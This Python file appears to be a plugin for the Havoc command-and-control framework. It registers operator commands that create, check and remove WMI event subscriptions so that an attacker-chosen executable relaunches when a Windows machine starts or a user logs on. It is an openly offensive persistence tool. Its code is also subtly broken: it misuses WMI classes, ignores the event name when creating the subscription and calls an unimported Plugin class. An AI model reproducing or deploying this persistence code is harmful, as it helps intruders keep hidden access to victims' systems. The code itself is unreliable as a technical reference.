from havoc import Demon, RegisterCommand
import wmi
import platform

def create_wmi_persistence(event_name, executable_path, trigger="startup"):
    """
    Creates a WMI event subscription for persistence.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] WMI persistence is only supported on Windows."

        c = wmi.WMI()

        # Define the event filter
        event_filter = c.Win32_ProcessStartTrace.watch_for(
            event_type="creation",
            ProcessName="explorer.exe" if trigger == "logon" else "winlogon.exe"
        )

        # Define the event consumer
        event_consumer = c.Win32_ProcessStartup.new(
            CommandLineTemplate=executable_path
        )

        # Bind the filter to the consumer
        c.Win32_FilterToConsumerBinding.new(
            Filter=event_filter,
            Consumer=event_consumer
        )

        return f"[+] WMI persistence created: {event_name} -> {executable_path} (Trigger: {trigger})"
    except Exception as e:
        return f"[-] Error creating WMI persistence: {e}"

def remove_wmi_persistence(event_name):
    """
    Removes a WMI event subscription.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] WMI persistence is only supported on Windows."

        c = wmi.WMI()

        # Find and remove the event filter
        for filter in c.Win32_EventFilter(Name=event_name):
            filter.Delete_()

        # Find and remove the event consumer
        for consumer in c.Win32_EventConsumer(Name=event_name):
            consumer.Delete_()

        # Find and remove the binding
        for binding in c.Win32_FilterToConsumerBinding():
            if binding.Filter.Name == event_name or binding.Consumer.Name == event_name:
                binding.Delete_()

        return f"[+] WMI persistence removed: {event_name}"
    except Exception as e:
        return f"[-] Error removing WMI persistence: {e}"

def check_wmi_persistence(event_name):
    """
    Checks if a WMI event subscription exists.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] WMI persistence is only supported on Windows."

        c = wmi.WMI()

        # Check for the event filter
        filters = c.Win32_EventFilter(Name=event_name)
        if not filters:
            return f"[-] WMI persistence not found: {event_name}"

        # Check for the event consumer
        consumers = c.Win32_EventConsumer(Name=event_name)
        if not consumers:
            return f"[-] WMI persistence not found: {event_name}"

        # Check for the binding
        bindings = c.Win32_FilterToConsumerBinding()
        for binding in bindings:
            if binding.Filter.Name == event_name or binding.Consumer.Name == event_name:
                return f"[+] WMI persistence found: {event_name}"

        return f"[-] WMI persistence not found: {event_name}"
    except Exception as e:
        return f"[-] Error checking WMI persistence: {e}"

# Havoc C2 Integration
def create_wmi_persistence_command(demon, *args):
    """
    Command to create a WMI event subscription for persistence.
    """
    if len(args) != 3:
        demon.ConsoleWrite("[-] Usage: create_wmi_persistence [event_name] [executable_path] [trigger]")
        return

    event_name = args[0]
    executable_path = args[1]
    trigger = args[2]

    result = create_wmi_persistence(event_name, executable_path, trigger)
    demon.ConsoleWrite(result)

def remove_wmi_persistence_command(demon, *args):
    """
    Command to remove a WMI event subscription.
    """
    if len(args) != 1:
        demon.ConsoleWrite("[-] Usage: remove_wmi_persistence [event_name]")
        return

    event_name = args[0]

    result = remove_wmi_persistence(event_name)
    demon.ConsoleWrite(result)

def check_wmi_persistence_command(demon, *args):
    """
    Command to check if a WMI event subscription exists.
    """
    if len(args) != 1:
        demon.ConsoleWrite("[-] Usage: check_wmi_persistence [event_name]")
        return

    event_name = args[0]

    result = check_wmi_persistence(event_name)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("create_wmi_persistence", "Create a WMI event subscription for persistence", create_wmi_persistence_command)
    RegisterCommand("remove_wmi_persistence", "Remove a WMI event subscription", remove_wmi_persistence_command)
    RegisterCommand("check_wmi_persistence", "Check if a WMI event subscription exists", check_wmi_persistence_command)

# Initialize the plugin
plugin = Plugin("WMIPersistence", "Advanced WMI persistence techniques", initialize)